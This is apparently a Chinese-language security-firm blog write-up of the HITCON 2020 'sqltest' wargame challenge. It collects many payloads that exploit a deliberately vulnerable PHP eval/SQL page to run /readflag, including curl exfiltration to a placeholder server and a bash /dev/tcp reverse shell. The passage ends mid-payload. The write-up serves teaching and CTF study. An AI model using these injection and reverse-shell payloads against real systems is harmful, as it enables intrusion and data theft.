@@ -1,0 +1,663 @@
+
+<!DOCTYPE html>
+<html lang="zh-TW">
+  <head>
+    <meta charset="utf-8" />
+    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible" />
+    <meta content="width=device-width, initial-scale=1" name="viewport" />
+    <title>DEVCORE Wargame at HITCON 2020 | DEVCORE 戴夫寇爾</title><link href="/assets/themes/devcore-v2/stylesheets/webpack_bundle.css" rel="stylesheet" />
+    <link href="/assets/themes/devcore-v2/images/favicon.png" rel="icon" size="32x32">
+    <meta name="description" property="og:description" content="HITCON 2020 DEVCORE Wargame 其中一題 sqltest 解析。需要構造一個字串，同時為合法的 SQL 語句與 PHP 語句，讓 SQL 執行時有回傳值且 PHP 執行時能夠執行任意系統指令。" />
+    <meta name="keywords" content="wargame, sqltest" />
+    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
+    <meta property="og:title" content="DEVCORE Wargame at HITCON 2020 | DEVCORE 戴夫寇爾" />
+    <meta property="og:url" content="https://devco.re/blog/2020/10/30/devcore-wargame-at-hitcon-2020/" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="https://devco.re/assets/img/blog/20201030/cover.png" />
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="d3vc0r3">
+    <meta name="twitter:title" content="DEVCORE Wargame at HITCON 2020 | DEVCORE 戴夫寇爾">
+    <meta name="twitter:description" content="HITCON 2020 DEVCORE Wargame 其中一題 sqltest 解析。需要構造一個字串，同時為合法的 SQL 語句與 PHP 語句，讓 SQL 執行時有回傳值且 PHP 執行時能夠執行任意系統指令。">
+    <meta name="twitter:creator" content="d3vc0r3">
+    <meta name="twitter:image:src" content="https://devco.re/assets/img/blog/20201030/cover.png">
+    <meta name="twitter:domain" content="devco.re">
+    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
+    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
+    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
+    <meta name='yandex-verification' content='4561963cf1d18fe3' />
+    <meta property="fb:admins" content="120968921404653" />
+
+    <link rel="canonical" href="https://devco.re/blog/2020/10/30/devcore-wargame-at-hitcon-2020/"/>
+    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">
+
+  </head>
+  <body>
+    <div class="page">
+      <div class="container--wrapper">
+        <div class="topbar">
+          <div class="topbar__brand">
+            <a href="/">
+                <div class="logo">
+                  DEVCORE 戴夫寇爾
+                </div></a>
+            <p class="slogan">
+              我們提供<a href="/services/penetration-test" class="link">滲透測試</a>、<a href="/services/red-team" class="link">紅隊演練</a>、<a href="/services/security-consulting" class="link">資安顧問</a>與<a href="/services/security-training" class="link">教育訓練</a>服務
+            </p>
+          </div>
+          <div class="drawer" id="drawer">
+            <div class="drawer__container">
+              <nav class="main-menu">
+                <div class="hidden">
+                  主選單
+                </div>
+                <a href="/services/penetration-test" class="main-menu__link mobile-only">滲透測試</a>
+                <a href="/services/red-team" class="main-menu__link mobile-only">紅隊演練</a>
+                <a href="/services/security-consulting" class="main-menu__link mobile-only">資安顧問</a>
+                <a href="/services/security-training" class="main-menu__link mobile-only">教育訓練</a>
+                <a href="/about/" class="main-menu__link">駭客思維</a><a href="/blog/" class="main-menu__link">最新訊息</a><a href="/search/" class="main-menu__link main-menu__search desktop-only"><span class="hidden">搜尋</span><svg class="icon-search icon"><use xlink:href="#icon-search" /></svg></a>
+              </nav>
+              <a href="/contact/" class="drawer__contact button--dense">聯絡我們</a>
+              <nav class="lang-menu">
+                <div class="lang-menu__label">
+                  語言:
+                </div>
+                <a href="/" class="lang-menu__link">中文</a>
+                <a href="/en/" class="lang-menu__link">English</a>
+              </nav>
+            </div>
+          </div><span class="topbar__menu mobile-only">menu</span><button class="appearance-none topbar__hamburger mobile-only" data-toggle="#drawer" id="drawer-toggle" type="button">
+            <div class="bars">
+              <div class="bar"></div>
+              <div class="bar"></div>
+              <div class="bar"></div>
+            </div>
+          </button>
+        </div>
+      </div><main role="main">
+
+
+          <div class="container--wrapper">
+            <div class="container">
+              <section class="blog-header">
+                <small class="blog-header__category"><a href="/blog/category/技術專欄/">技術專欄</a></small>
+                <img src="https://devco.re/assets/img/blog/20201030/cover.png" class="blog-header__image" alt="DEVCORE Wargame at HITCON 2020" />
+                <h1 class="blog-header__title">
+                  DEVCORE Wargame at HITCON 2020
+                </h1>
+                <div class="blog-header__tags">
+                  
+                  <a href="/blog/tag/PHP/" class="blog-header__tag">PHP</a><a href="/blog/tag/RCE/" class="blog-header__tag">RCE</a>
+                </div>
+          
+          
+                <p class="blog-header__info">
+                  By <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/cyku.jpg)"></span> <a href="/blog/author/cyku" class="author-name">Cyku</a> <time class="date">on 2020-10-30 </time>
+                </p>
+          
+              </section>
+              <article class="article">
+          <style type="text/css">
+    table {
+        display: block;
+        width: 100%;
+        overflow: auto;
+        word-break: normal;
+        word-break: keep-all;
+        font-size: smaller;
+    }
+
+    table th {
+        font-weight: bold
+    }
+
+    table th,
+    table td {
+        padding: 5px 11px;
+        border: 1px solid #ddd;
+    }
+
+    table tr {
+        background-color: #fff;
+        border-top: 1px solid #ccc;
+    }
+
+    table tr:nth-child(2n) {
+        background-color: #f8f8f8;
+    }
+</style>
+
+<p>搭晚安～一年一度的資安圈大拜拜活動之一 HITCON 2020 在約一個月前順利落幕啦，今年我們照舊在攤位準備了幾道小小的 Wargame 給會眾朋友們挑戰自身技術，並同樣準備了幾份精美小禮物送給挑戰成功的朋友們。</p>
+
+<p>總計活動兩天間有登入並提交至少一把 flag 的人數為 92 人，非常感謝大家踴躍地參與，這次未能成功在時間內完成挑戰而未領到小禮物的朋友們也別太灰心，為了能更多的回饋社群，所以我們決定寫一篇技術文章介紹本次 Wargame 的其中一道開放式題目<code class="highlighter-rouge">sqltest</code>，為此我們在活動後詢問了所有解題的人，收集了大家的解法與思路，並將在文章的接下來一一為大家介紹！</p>
+
+<h2 id="sqltest-題目說明">sqltest 題目說明</h2>
+
+<p>這道題目主要核心的部分就這 3 個檔案：Dockerfile、readflag.c 和 index.php。讓我們先看看前兩個檔案，可以從下方的 Dockerfile 中先觀察到 flag 被放置在檔案 /flag 之中，但權限被設定為僅有 root 可以讀取，另外準備了具有 setuid 權限的執行檔 /readflag，讓任何人均可在執行此檔案時偽裝成 root 身分，而 /readflag 的原始碼就如下方 readflag.c 所示，很單純的讀取並輸出 /flag 檔案內容，這個配置就是一個很標準以 getshell 為目標的 Wargame 題目。</p>
+
+<p><strong>Dockerfile</strong></p>
+
+<div class="language-dockerfile highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">FROM</span><span class="s"> php:7.4.10-apache</span>
+
+<span class="c"># setup OS env</span>
+<span class="k">RUN </span>apt update <span class="nt">-y</span>
+<span class="k">RUN </span>docker-php-ext-install mysqli
+<span class="k">RUN </span>docker-php-ext-enable mysqli
+
+<span class="c"># setup web application</span>
+<span class="k">COPY</span><span class="s"> ./src/ /var/www/html/</span>
+
+<span class="c"># setup flag</span>
+<span class="k">RUN </span><span class="nb">echo</span> <span class="s2">"DEVCORE{flag}"</span> <span class="o">&gt;</span> /flag
+<span class="k">RUN </span><span class="nb">chmod </span>0400 /flag
+<span class="k">RUN </span><span class="nb">chown </span>root:root /flag
+<span class="k">COPY</span><span class="s"> readflag.c /readflag.c</span>
+<span class="k">RUN </span>gcc <span class="nt">-o</span> /readflag /readflag.c
+<span class="k">RUN </span><span class="nb">chmod </span>4555 /readflag
+</code></pre></div></div>
+
+<p><strong>readflag.c</strong></p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">seteuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">setegid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/cat /flag"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>上述前半部為環境的佈置，真正題目的開始則要見下方 index.php，其中 <code class="highlighter-rouge">$_REQUEST</code> 是我們可以任意控制的參數，題目除了 isset 外並無其他任何檢查，隨後第 8 行中參數被帶入 SQL 語句作執行，如果 SQL 執行成功並且有查詢到資料，就會進入 15 行開始的處理，來自 <code class="highlighter-rouge">$_REQUEST</code> 的 <code class="highlighter-rouge">$column</code> 變數再次被使用並傳入 eval 作執行，這樣看下來題目的解題思路就很清楚了，我們需要構造一個字串，同時為合法的 SQL 語句與 PHP 語句，讓 SQL 執行時有回傳值且 PHP 執行時能夠執行任意系統指令，就能 getshell 並呼叫 /readflag 取得 flag！</p>
+
+<p><strong>index.php</strong></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"column"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"id"</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">die</span><span class="p">(</span><span class="s1">'No input'</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="nv">$column</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"column"</span><span class="p">];</span>
+<span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"id"</span><span class="p">];</span>
+<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"select "</span><span class="o">.</span><span class="nv">$column</span><span class="o">.</span><span class="s2">" from mytable where id ='"</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s2">"'"</span> <span class="p">;</span>
+
+<span class="nv">$conn</span> <span class="o">=</span> <span class="nb">mysqli_connect</span><span class="p">(</span><span class="s1">'mysql'</span><span class="p">,</span> <span class="s1">'user'</span><span class="p">,</span> <span class="s1">'youtu.be/l11uaEjA-iI'</span><span class="p">,</span> <span class="s1">'sqltest'</span><span class="p">);</span>
+
+<span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span> <span class="nv">$result</span> <span class="p">){</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="nx">mysqli_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_object</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+        <span class="nv">$str</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\$</span><span class="s2">output = </span><span class="se">\$</span><span class="s2">row-&gt;"</span><span class="o">.</span><span class="nv">$column</span><span class="o">.</span><span class="s2">";"</span><span class="p">;</span>
+        <span class="k">eval</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="k">die</span><span class="p">(</span><span class="s1">'Database error'</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$output</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="nv">$output</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="出題者解法">出題者解法</h2>
+
+<p>身為出題者，當然必須先拋磚一下才能夠引玉～</p>
+
+<p><strong>exploit:</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column={passthru('/readflag')}&amp;id=1
+
+SQL: SELECT {passthru('/readflag')} FROM mytable WHERE id = '1'
+PHP: $output = $row-&gt;{passthru('/readflag')};
+</code></pre></div></div>
+
+<p>這個解法利用了 MySQL 一個相容性的特性，<code class="highlighter-rouge">{identifier expr}</code> 是 ODBC Escape 語法，MySQL 相容了這個語法，使得在語句中出現時不會導致語法錯誤，因此我們可以構造出 <code class="highlighter-rouge">SELECT {passthru '/readflag'} FROM mytable WHERE id = '1'</code> 字串仍然會是合法的 SQL 語句，更進一步地嘗試將 ODBC Escape 中的空白移除改以括號包夾字串的話，會變成 <code class="highlighter-rouge">SELECT {passthru('/readflag')} FROM mytable WHERE id = '1'</code>，由於 MySQL 提供的語法彈性，此段語句仍然會被視為合法並且可正常執行得到相同結果。</p>
+
+<p>接著再看進到 eval 前會構造出這樣的 PHP 語句：<code class="highlighter-rouge">$output = $row-&gt;{passthru('/readflag')}</code>，由於 PHP 在語法上也提供了極大的彈性，使得我們可以利用 <code class="highlighter-rouge">$object-&gt;{ expr }</code> 這樣的語法將 expr 敘述句動態執行完的結果作為物件屬性名稱去存取物件的屬性，因此結果就會呼叫 passthru 函式執行系統指令。</p>
+
+<p>這邊補充一個冷知識，當想到系統指令時，大家直覺可能會想到使用 system 函式，但是 MySQL 在 8.0.3 中將 system 加入關鍵字保留字之中，而這題目環境是使用 MySQL 8.0 架設的，所以如果使用 system 的話反而會失敗唷！</p>
+
+<h2 id="來自會眾朋友們的解法">來自會眾朋友們的解法</h2>
+
+<p>由於朋友們踴躍提交的解法眾多，所以我們將各解法簡單做了分組，另外提醒一下，以下順序只是提交的先後時間差，並無任何優劣，能取得 flag 的解法都是好解法！接下來就讓我們進行介紹吧。</p>
+
+<h3 id="odbc-escape">ODBC Escape</h3>
+
+<p><strong>by Mico (https://www.facebook.com/MicoDer/):</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column={exec(%27curl%20http://Mico_SRV/?`/readflag`%27)};%23&amp;id=1
+
+SQL: SELECT {exec('curl http://Mico_SRV/?`/readflag`')};# FROM mytable WHERE id = '1'
+PHP: $output = $row-&gt;{exec('curl http://Mico_SRV/?`/readflag`')};#;
+</code></pre></div></div>
+
+<p>這個解法與出題者的十分類似，但沒有使用可以直接輸出結果的 passthru 而是改用 exec，接著透過 curl 把結果回傳至自己的伺服器，據本人說法是因為「覺得駭客就該傳些什麼回來自己Server XD 」XD。</p>
+
+<h3 id="comment-everywhere">Comment Everywhere</h3>
+
+<p>幾乎所有程式語言都有註解符號可以讓開發人員在程式碼中間加上文字說明，以便下一個開發人員接手時可以快速理解這段程式碼的意義。當然 SQL 與 PHP 也有各自的註解符號，但它們所支援的符號表示稍微有些差異，而這小差異就可以幫助我們達成目的。</p>
+
+<p><strong>by LJP (https://ljp-tw.github.io/blog/)</strong>:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=id%0a-- /*%0a-- */ ; system('/readflag');%0a&amp;id=1
+
+SQL: SELECT id
+     -- /*
+     -- */ ; system('/readflag');
+     FROM mytable WHERE id = '1'
+PHP: $output = id
+     -- /*
+     -- */ ; system('/readflag');
+     ;
+</code></pre></div></div>
+
+<p>這個解法看似複雜，本質上其實很單純，就是利用兩個語言支援不同註解符號的特性。對於 SQL 而言，<code class="highlighter-rouge">--</code> 是註解符號，會無視後方所有到換行為止的文字，所以每一行以 <code class="highlighter-rouge">--</code> 開頭的字串，SQL 是看不見的。接著來看 PHP，對於 PHP 而言，<code class="highlighter-rouge">/* 任何字串 */</code> 這是註解的表示方式，開頭結尾由 / 與 * 組成，中間被包夾的字串是看不見的，並且支援換行，而 <code class="highlighter-rouge">--</code> 在 PHP 之中則代表遞減運算子，所以如 <code class="highlighter-rouge">$output --</code> 字串其實是在對 $output 進行減 1 的操作。綜合上面特性，對於上面的解法，其實只有 PHP 看見的第三行 ` ; system(‘/readflag’);` 會認為是需要執行的程式碼，其餘部分不論是 SQL 還是 PHP 都以為是註解的字串而無視，因此可以順利執行取得 flag。</p>
+
+<p><strong>by ankleboy (https://www.facebook.com/profile.php?id=100001963625238):</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=name%20/*!%20from%20mytable%20*/%20--%20;%20system(%22/readflag%22)&amp;id=1
+
+SQL: SELECT name /*! from mytable */ -- ; system("/readflag") FROM mytable WHERE id = '1'
+PHP: $output = $row-&gt;name /*! from mytable */ -- ; system("/readflag");
+</code></pre></div></div>
+
+<p>此解法也是同樣運用註解，但使用的註解符號似乎稍微特殊，<code class="highlighter-rouge">/* */</code> 除了 PHP 之外，MySQL 也同樣支援此允許多行的註解符號，但假如多上一個驚嘆號 <code class="highlighter-rouge">/*! */</code>，事情就又稍微不同了，這是 MySQL 特有的變種註解符號，在此符號中的字串，仍然會被 MySQL 當成 SQL 的一部分執行，但在其他 DBMS 之中，因為是 <code class="highlighter-rouge">/*</code> 開頭就會認為它就是單純的註解文字而忽視，讓開發人員能撰寫可 portable 的程式碼。因此就能製造出一串註解文字可被 MySQL 看見但無法被 PHP 看見，強制在註解文字裡讓 SQL 構造合法語句，再利用 <code class="highlighter-rouge">--</code> 註解閉合所有冗贅 SQL 語句，緊接著 <code class="highlighter-rouge">--</code> 後就能撰寫任意 PHP 執行碼。</p>
+
+<p><strong>by FI:</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`%23?&gt;&amp;id=1
+
+SQL: SELECT id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`#?&gt; FROM mytable WHERE id = '1'
+PHP: $output = $row-&gt;id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`#?&gt;;
+</code></pre></div></div>
+
+<p>同樣是利用 <code class="highlighter-rouge">/*! */</code> 註解符號強行構造合法查詢，不過有趣的是，MySQL 支援 <code class="highlighter-rouge">#</code> 單行的註解符號，此註解符號同樣也被 PHP 支援，所以不會導致 PHP 語法錯誤，最後還多了 <code class="highlighter-rouge">?&gt;</code> 強行結束 PHP 程式區塊，冷知識是如果程式碼是 PHP 程式區塊內最後一行的話，不加 <code class="highlighter-rouge">;</code> 並不會導致語法錯誤唷 :P</p>
+
+<p><strong>by tree:</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=null--+.$output=exec('/readflag')&amp;id=
+
+SQL: SELECT null-- .$output=exec('/readflag') FROM mytable WHERE id = '1'
+PHP: $output = $row-&gt;null-- .$output=exec('/readflag');
+</code></pre></div></div>
+
+<p>也是用了 <code class="highlighter-rouge">--</code> 把 PHP 程式碼的部分在 SQL 裡面遮蔽起來，利用了 null 關鍵字讓 SQL 查詢有回傳結果，但在 PHP 之中卻變成 <code class="highlighter-rouge">$row-&gt;null</code> 對 $row 物件存取名為 null 的屬性，使得 PHP 也能合法執行，最後將指令執行結果覆蓋 $output 變數，讓題目幫助我們輸出結果。</p>
+
+<p><strong>by cebrusfs (https://www.facebook.com/menghuan.yu):</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=NULL;%20--%20$b;var_dump(exec(%22/readflag%22))&amp;id=1
+
+SQL: SELECT column=NULL; -- $b;var_dump(exec("/readflag")) FROM mytable WHERE id = '1'
+PHP: $output = $row-&gt;column=NULL; -- $b;var_dump(exec("/readflag"));
+</code></pre></div></div>
+
+<p>此解法也是類似的思路，運用 <code class="highlighter-rouge">--</code> 閉合再湊出合法 PHP 程式碼，最後直接使用 var_dump 強制輸出 exec 的執行結果。</p>
+
+<p><strong>by Jason3e7 (https://github.com/jason3e7):</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=NULL;-- $id %2b system('/readflag');%23&amp;id=1
+
+SQL: SELECT NULL;-- $id + system('/readflag');# FROM mytable WHERE id = '1'
+PHP: $output = $row-&gt;NULL;-- $id + system('/readflag');#;
+</code></pre></div></div>
+
+<p>這也是相似的思路，有趣的是 <code class="highlighter-rouge">-- $id</code> 這個部分，大家一定記得 <code class="highlighter-rouge">$id --</code> 是遞減運算子，但有時可能會忘記 <code class="highlighter-rouge">-- $id</code> 也同樣是遞減運算子，所以這個 <code class="highlighter-rouge">--</code> 會使得 MySQL 認為是註解，PHP 卻仍認為是遞減運算子並正常執行下去。</p>
+
+<p><strong>by shoui:</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=null-- -"1";"\$output = \$row-&gt;".system('/readflag').";";&amp;id=1
+
+SQL: SELECT null-- -"1";"\$output = \$row-&gt;".system('/readflag').";"; FROM mytable WHERE id = '1'
+PHP: $output = $row-&gt;null-- -"1";"\$output = \$row-&gt;".system('/readflag').";";;
+</code></pre></div></div>
+
+<p>同樣運用註解 <code class="highlighter-rouge">--</code> 閉合 SQL 但 PHP 又是遞減運算子的特性，而 system 又會將指令執行結果直接輸出，因此就能直接取得 flag。本人有補充說明當時測試時直接複製貼上原始碼那行接測試，後來使用 <code class="highlighter-rouge">?id=1&amp;column=null-- -"1";" ".system('/readflag').";"</code> 精簡後的 payload XD。</p>
+
+<h3 id="double-quoted-string-evaluation">Double-quoted String Evaluation</h3>
+
+<p>PHP 會自動在由雙引號「”」包夾的字串中，尋找 $ 開頭的字詞，將其解析成變數再把值代入字串中，這個功能對於快速輸出已充分跳脫處理的變數值非常有幫助，可以增加程式碼可讀性；但同樣地，我們也可以利用這個功能做一下有趣的事情，例如這段 PHP 程式碼 <code class="highlighter-rouge">$str = "${phpinfo()}";</code> 就可以直接執行 phpinfo 函式，利用 <code class="highlighter-rouge">$str = "${system('id')}";</code> 就可以執行系統指令；而在 MySQL 中，雙引號「”」恰好也可以被用來表示純字串，所以我們就能構造出「MySQL 認為是純字串，PHP 卻認為需要解析執行」的 Payload。</p>
+
+<p>讓我們先來看第一個例子：</p>
+
+<p><strong>by ginoah:</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=id="${system('/readflag')}"&amp;id=1
+
+SQL: SELECT id="${system('/readflag')}" FROM mytable WHERE id = '1'
+PHP: $output = $row-&gt;id="${system('/readflag')}";
+</code></pre></div></div>
+
+<p>對於 SQL 而言，就是回傳 id 與字串比較的結果；但對於 PHP 而言，上述結果是將雙引號字串解析完後才賦值給變數 <code class="highlighter-rouge">$row-&gt;id</code>，而結果就如同前面說的，它會執行系統指令 /readflag，還會將結果輸出至網頁，所以就能取得 flag！</p>
+
+<p><strong>by Billy (https://github.com/st424204):</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=name%2b"{$_POST[1]($_POST[2])}"&amp;id=1
+POST: 1=system&amp;2=/readflag
+
+SQL: SELECT name+"{$_POST[1]($_POST[2])}" FROM mytable WHERE id = '1'
+PHP: $output = $row-&gt;name+"{$_POST[1]($_POST[2])}";
+</code></pre></div></div>
+
+<p>同樣利用雙引號特性，但這個例子構造的較為複雜，利用了一些鬆軟特性，在 PHP 中，若字串變數是一個存在的函式的名稱，則我們可以利用 <code class="highlighter-rouge">$func = 'system'; $func('id');</code> 這樣的方式來呼叫該變數，這個例子就是應用了這個特性，將我們從前端傳遞過去的 <code class="highlighter-rouge">$_POST[1]</code> 當成函式名稱、<code class="highlighter-rouge">$_POST[2]</code> 作為函式的參數執行，因此只要參數再帶上 <code class="highlighter-rouge">1=system&amp;2=readflag</code> 就能取得 flag！</p>
+
+<p><strong>by Hans (https://hans00.me)</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=id||"{$_POST['fn']($_POST['cmd'])}"&amp;id=1
+POST: fn=system&amp;cmd=/readflag
+
+SQL: SELECT id||"{$_POST['fn']($_POST['cmd'])}" FROM mytable WHERE id = '1'
+PHP: $output = $row-&gt;id||"{$_POST['fn']($_POST['cmd'])}";
+</code></pre></div></div>
+
+<p>這個例子與前一個利用了同樣的特性，差別在與此處的 Payload 改用 OR 邏輯運算子 <code class="highlighter-rouge">||</code>，而前面使用的是加法算術運算子 <code class="highlighter-rouge">+</code>，但結果都是相同的。</p>
+
+<p><strong>by Chris Lin (https://github.com/kulisu)</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=TRUE/"${system(%27/readflag%27)}";%23&amp;id=1
+
+SQL: SELECT TRUE/"${system('/readflag')}";# FROM mytable WHERE id = '1'
+PHP: $output = $row-&gt;TRUE/"${system('/readflag')}";#;
+</code></pre></div></div>
+
+<p>這也是用相同概念，前面改用除法算術運算子 <code class="highlighter-rouge">/</code>。看完解法才發現投稿者是同事！</p>
+
+<p><img src="/assets/img/blog/20201030/1.png" alt="" /></p>
+
+<h3 id="execution-operator">Execution Operator</h3>
+
+<p>在 PHP 中存在眾多函式可以執行系統指令，其中還包括一個特殊的 <a href="https://www.php.net/manual/en/language.operators.execution.php">Execution Operator</a>，此運算子的形式是利用反引號「<code class="highlighter-rouge">`</code>」將字串包夾起來，這樣該字串就會被當作系統指令執行，其內部實際是執行 shell_exec，更貼心的事情是，這個運算子同樣支援 Double-quoted String Evaluation，所以若是 <code class="highlighter-rouge">$cmd = 'id'; echo `$cmd`;</code> 這樣的形式，PHP 就會先解析 $cmd 得出 id，再執行 id 系統指令；而在 MySQL 之中，反引號是用來表示一個 identifier，identifier 用來指示一個物件，最常見的是資料表或是資料欄，當我們執行 <code class="highlighter-rouge">SELECT c FROM t</code>，其中 c 和 t 就是 identifier，所以若想靠 Execution Operator 來執行指令，可能還必須同時讓 identifier 能夠被 MySQL 識別才行。</p>
+
+<p><strong>by dalun (https://www.nisra.net):</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=id=`$_POST[1]`%23?&gt;&amp;id=%0a+from+(select+'id','$_POST[1]')+as+a+--+
+POST: 1=/readflag
+
+SQL: SELECT id=`$_POST[1]`#?&gt; FROM mytable WHERE id = '
+     from (select 'id','$_POST[1]') as a -- '
+PHP: $output = $row-&gt;id=`$_POST[1]`#?&gt;;
+</code></pre></div></div>
+
+<p>這個解法似乎是唯一願意使用 id 參數的 XD！在 column 參數用註解符號 <code class="highlighter-rouge">#</code> 閉合後續，在 id 參數插入換行符號並構造一個合法的 SQL，透過子查詢製造合法的 identifier，最後由 PHP 透過 execution operator 執行系統指令。</p>
+
+<p><strong>by HexRabbit (https://twitter.com/h3xr4bb1t):</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=name+or+@`bash+-c+"bash+-i+&gt;%26+/dev/tcp/1.2.3.4/80+0&gt;%261"`&amp;id=1
+
+SQL: SELECT name or @`bash -c "bash -i &gt;&amp; /dev/tcp/1.2.3.4/80 0&gt;&amp;1"` FROM mytable WHERE id = '1'
+PHP: $output = $row-&gt;name or @`bash -c "bash -i &gt;&amp; /dev/tcp/1.2.3.4/80 0&gt;&amp;1"`;
+</code></pre></div></div>
+
+<p>這個解法核心也是透過 execution oeperator 執行指令，不過用了一個特殊的字元 <code class="highlighter-rouge">@</code>。在 MySQL 中，這代表 user-defined variables，後面的字串則為變數的名稱，而且名稱可以使用特殊字元，只要使用 identifier 的符號 <code class="highlighter-rouge">`</code> 把字串包夾起來即可，而存取不存在的變數並不會導致錯誤，MySQL 只會回傳 NULL 的結果。在 PHP 中的話，<code class="highlighter-rouge">@</code> 代表 <a href="https://www.php.net/language.operators.errorcontrol">error control operator</a>，可以放置在表達式前，會讓 PHP 將此表達式執行產生的錯誤訊息全部忽略，由於是表達式，所以也能附加在 execution operator 之前。最後這個解法再用 <code class="highlighter-rouge">or</code> 邏輯運算子（MySQL 與 PHP 皆支援並且意義相同）串接即可達成執行系統指令。</p>
+
+<p><strong>by cjiso1117 (https://twitter.com/cjiso)</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=$a%2b`curl 127.0.0.1/$(/readflag)`/*!from (select "asd" as "$a", "qwe" as "curl 127.0.0.1/$(/readflag)" ) as e*/;%23&amp;id=qwe
+
+SQL: SELECT $a+`curl 127.0.0.1/$(/readflag)`/*!from (select "asd" as "$a", "qwe" as "curl 127.0.0.1/$(/readflag)" ) as e*/;# FROM mytable WHERE id = 'qwe'
+PHP: $output = $row-&gt;$a+`curl 127.0.0.1/$(/readflag)`/*!from (select "asd" as "$a", "qwe" as "curl 127.0.0.1/$(/readflag)" ) as e*/;#;
+</code></pre></div></div>
+
+<p>同樣是利用 <code class="highlighter-rouge">/*! */</code> 製造出 PHP 看不見、MySQL 看得見的註解文字來控制資料庫查詢結果，最後利用 execution operator 來達成執行系統指令，但由於 <code class="highlighter-rouge">`</code> 內的文字會被 MySQL 認為是 identifier，找不到對應資源會導致錯誤，所以透過子查詢和 alias 語法強行製造出 identifier 讓查詢正確執行。<del>本人表示一開始覺得用 <code class="highlighter-rouge">/*! */</code> 會很帥，結果走偏繞了一大圈</del></p>
+
+<p><strong>by shik (https://github.com/ShikChen/)</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=id%2b"${print_r(`/readflag`)}"&amp;id=1
+
